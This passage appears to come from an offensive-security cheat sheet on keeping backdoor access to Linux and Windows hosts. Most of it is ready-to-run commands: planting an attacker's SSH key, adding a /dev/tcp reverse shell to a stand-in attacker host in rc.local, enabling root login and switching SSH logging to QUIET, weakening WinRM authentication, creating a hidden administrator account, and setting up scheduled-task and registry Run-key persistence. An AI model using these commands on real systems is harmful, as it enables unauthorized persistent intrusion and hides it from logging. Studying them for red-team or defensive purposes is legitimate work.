!!! tip "Tip"
    For SSH backdoor, add your public key to `~/.ssh/authorized_keys` (or `/root/.ssh/authorized_keys`). No password needed and it survives password changes. For WinRM, enable it with `Enable-PSRemoting -Force` and add your user to the Remote Management Users group.

## SSH Backdoor Persistence

### Adding an Attacker's SSH Key

One of the simplest ways to maintain SSH access is to add an attacker's SSH key to the target's `~/.ssh/authorized_keys` file.

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

This allows the attacker to log in without requiring a password.

### Creating a Persistent Reverse Shell

To ensure access, a reverse SSH shell can be added to `rc.local`:

```bash
echo "nohup bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 &" >> /etc/rc.local
```

### Modifying SSH Configuration

An attacker may configure SSH to allow root login or disable logging:

```bash
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "LogLevel QUIET" >> /etc/ssh/sshd_config
systemctl restart ssh
```

---

## WinRM Backdoor Persistence

Windows Remote Management (WinRM) is a powerful way to maintain persistent access to a Windows machine.

### Enabling WinRM

If disabled, an attacker can enable WinRM with:

```powershell
winrm quickconfig
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}
```

### Creating a Malicious WinRM User

To create a backdoor user with admin privileges:

```powershell
net user backdoor P@ssw0rd /add
net localgroup Administrators backdoor /add
```

### Using Evil-WinRM for Remote Access

Once a foothold is established, the attacker can use Evil-WinRM to maintain access:

```bash
evil-winrm -i <target-ip> -u backdoor -p P@ssw0rd
```

### Persisting with Scheduled Tasks

A scheduled task can be created to execute a malicious script:

```powershell
schtasks /create /sc minute /mo 5 /tn "WinRM_Backdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\backdoor.ps1"
```

### Creating a Registry-Based Backdoor

By modifying registry settings, WinRM can be configured for persistence:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinRM_Backdoor" /t REG_SZ /d "powershell -ExecutionPolicy Bypass -File C:\backdoor.ps1" /f
```

These techniques ensure an attacker maintains access even after a system reboot.